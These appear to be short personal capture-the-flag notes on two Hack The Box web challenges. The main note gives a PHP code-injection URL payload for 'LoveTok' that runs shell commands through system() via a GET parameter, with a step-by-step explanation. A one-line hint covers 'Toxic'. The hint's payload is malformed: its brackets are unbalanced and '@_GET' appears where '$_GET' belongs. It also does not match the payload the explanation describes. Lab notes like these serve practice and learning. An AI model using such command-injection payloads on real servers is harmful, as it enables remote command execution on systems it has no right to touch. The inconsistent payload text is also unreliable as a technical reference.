**01 web_lovetok:**
    Link: https://app.hackthebox.com/challenges/lovetok
    Hint/Solution "?format=${system(@_GET[cmd]}&cmd=ls ../"
    Explanation: 
    A. http://178.62.11.21:30505/: This is the base URL.
    B. ?format=$_{system($_GET[1])}: This part of the URL suggests an attempt to inject code. 
    C. It looks like it's trying to use the system function in PHP to execute a command specified in the $_GET[1] parameter.
    D. &1=ls+/: The &1=ls+/ part is likely an attempt to pass the command ls+/ as the value for the $_GET[1] parameter. 
    E. This command typically lists the files and directories in a Unix/Linux system.

**02 Toxic:** cookie to base64
